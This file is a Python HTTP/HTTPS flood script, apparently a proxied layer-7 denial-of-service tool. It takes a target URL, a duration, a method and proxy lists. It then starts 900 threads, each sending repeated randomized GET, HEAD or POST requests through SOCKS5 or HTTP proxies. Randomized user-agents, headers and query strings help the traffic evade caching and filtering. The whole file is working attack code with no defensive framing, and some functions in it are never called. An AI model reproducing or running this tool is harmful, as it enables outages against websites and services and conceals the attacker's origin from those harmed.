import socket
import ssl
import time
import threading
import random
import sys
import socks
import datetime

try:
    target = str(sys.argv[1])
    timer = float(sys.argv[2])
    method = str(sys.argv[3])
    proxfile1 = str(sys.argv[4])
    proxfile2 = str(sys.argv[5])
except:
    sys.exit()

strings = "abcdefghijklmnopqrstuvwxyz1234566789"

method = method.upper()

hproxies = open(proxfile1).read().split()

sproxies = open(proxfile2).read().split()

if target[:7] == "http://":
    port = 80
    protocol = "http://"
    target = target[7:]
if target[:8] == "https://":
    port = 443
    protocol = "https://"
    target = target[8:]
target = target.split("/")
try:
    path = "/"+target[1]
except:
    path = "/"
target = target[0]

ciphers = ["ECDHE-RSA-AES256-SHA",
           "DHE-RSA-AES256-GCM-SHA384",
           "DHE-RSA-AES256-SHA256",
           "DHE-RSA-AES256-SHA"]

acceptall = [
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept-Encoding: gzip, deflate\r\n",
             "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
             "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
             "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xhtml+xml\r\n",
             "Accept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
             "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
             ]

def get_mix_headers(method):
    header = ""
    if method == "GET":
        useragent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        connection = "Proxy-connection: Keep-alive\r\nConnection: keep-alive\r\n"
        control = "Cache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\n"
        header = "\r\n" + useragent + accept + control + connection + "\r\n\r\n"
    elif method == "HEAD":
        useragent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        connection = "Proxy-connection: Keep-alive\r\nConnection: keep-alive\r\n"
        header = "\r\n" + useragent + accept + connection + "\r\n\r\n"
    elif method == "POST":
        datalen = str(random.randint(8,16))
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: " + protocol + target + path + "\r\n"
        user_agent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        length = "Content-Length: " + datalen + " \r\n"
        connection = "Connection: Keep-alive\r\n"
        data = str(random._urandom(int(datalen)))
        header = "\r\n" + accept + refer + content + user_agent + length + connection + "\r\n\r\n"
    return header

def build_useragent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = random.choice(
            ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0',
             'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8',
             'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2020, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 99)) + '.0'
        engine = str(random.randint(1, 99)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def get_headers():
    header = ""
    if method == "GET":
        useragent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        connection = "Proxy-connection: Keep-alive\r\nConnection: keep-alive\r\n"
        control = "Cache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\n"
        header = "\r\n" + useragent + accept + control + connection + "\r\n\r\n"
    elif method == "HEAD":
        useragent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        connection = "Proxy-connection: Keep-alive\r\nConnection: keep-alive\r\n"
        header = "\r\n" + useragent + accept + connection + "\r\n\r\n"
    elif method == "POST":
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: " + protocol + target + path + "\r\n"
        user_agent = "User-Agent: " + build_useragent() + "\r\n"
        accept = random.choice(acceptall)
        connection = "Connection: Keep-alive\r\n"
        header = "\r\n" + accept + refer + content + user_agent + connection + "\r\n\r\n"
    return header

def get_query():
    query = "q="
    for x in range(13):
        query += random.choice(strings)
    return query


timeout = time.time() + 1 * timer

def randsattack():
    if "?" in path:
        add = "&"
    else:
        add = "?"
    while time.time() < timeout:
        socks_proxy = random.choice(sproxies).split(":")
        s = socks.socksocket()
        s.settimeout(8)
        method = random.choice(["GET", "HEAD", "POST"])
        request = get_mix_headers(method)
        try:
            s.set_proxy(socks.SOCKS5, str(socks_proxy[0]), int(socks_proxy[1]))
            s.connect((target, port))
            s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target)
            for x in range(random.randint(64,128)):
                s.send(str.encode(method + " " + path + add + get_query() + " HTTP/1.2\r\nHost: " + target + request))
                time.sleep(0.1)
        except:
            s.close()
    return
    sys.exit()

def randhattack():
    if "?" in path:
        add = "&"
    else:
        add = "?"
    while time.time() < timeout:
        https_proxy = random.choice(hproxies).split(":")
        s = socks.socksocket()
        s.settimeout(8)
        method = random.choice(["GET", "HEAD", "POST"])
        request = get_mix_headers(method)
        try:
            s.set_proxy(socks.HTTP, str(https_proxy[0]), int(https_proxy[1]))
            s.connect((target, port))
            s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target)
            for x in range(random.randint(64,128)):
                s.send(str.encode(method + " " + path + add + get_query() + " HTTP/1.2\r\nHost: " + target + request))
                time.sleep(0.1)
        except:
            s.close()
    return
    sys.exit()

def sattack():
    if "?" in path:
        add = "&"
    else:
        add = "?"
    while time.time() < timeout:
        socks_proxy = random.choice(sproxies).split(":")
        s = socks.socksocket()
        s.settimeout(8)
        request = get_headers()
        try:
            s.set_proxy(socks.SOCKS5, str(socks_proxy[0]), int(socks_proxy[1]))
            s.connect((target, port))
            s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target)
            for x in range(random.randint(64,128)):
                s.send(str.encode(method + " " + path + add + get_query() + " HTTP/1.2\r\nHost: " + target + request))
                time.sleep(0.1)
        except:
            s.close()
    return
    sys.exit()

def hattack():
    if "?" in path:
        add = "&"
    else:
        add = "?"
    while time.time() < timeout:
        https_proxy = random.choice(hproxies).split(":")
        s = socks.socksocket()
        s.settimeout(8)
        request = get_headers()
        try:
            s.set_proxy(socks.HTTP, str(https_proxy[0]), int(https_proxy[1]))
            s.connect((target, port))
            s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target)
            for x in range(random.randint(64,128)):
                s.send(str.encode(method + " " + path + add + get_query() + " HTTP/1.2\r\nHost: " + target + request))
                time.sleep(0.1)
        except:
            s.close()
    return
    sys.exit()

if method == "GET" or method == "POST" or method == "HEAD":
    for x in range(450):
        threading.Thread(target=sattack, daemon=True).start()
        time.sleep(0.0035)
    for x in range(450):
        threading.Thread(target=sattack, daemon=True).start()
        time.sleep(0.0035)
else:
    for x in range(450):
        threading.Thread(target=randsattack, daemon=True).start()
        time.sleep(0.0035)
    for x in range(450):
        threading.Thread(target=randsattack, daemon=True).start()
        time.sleep(0.0035)

while time.time() < timeout:
    time.sleep(0.1)
sys.exit()